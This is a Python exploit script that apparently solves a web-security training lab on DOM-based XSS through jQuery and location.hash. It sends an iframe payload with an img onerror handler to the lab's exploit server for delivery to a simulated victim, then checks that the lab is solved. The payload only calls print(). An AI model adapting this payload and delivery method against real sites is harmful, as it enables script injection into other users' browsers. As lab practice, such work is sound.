import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def check_jquery(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    if 'location.hash' in r.text and 'scrollIntoView()' in r.text:
        print('[+] This web is using jquery')                
    else:
        print('[-] Can\'t detect jquery or not')

def send_vuln_query(s, exploit_url, exploit_path, payload): 
    target_url = exploit_url + exploit_path
    payload = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK \
                        Content-Type: text/html; charset=utf-8',
        'responseBody': payload,
        'formAction': 'DELIVER_TO_VICTIM'
    }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln query contain XSS')
    else:
        print('[-] Fail to send XSS query')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    check_jquery(s, url, '#a')
    send_vuln_query(s, exploit_url, '/', f"""<iframe src="{url}/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>""")
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()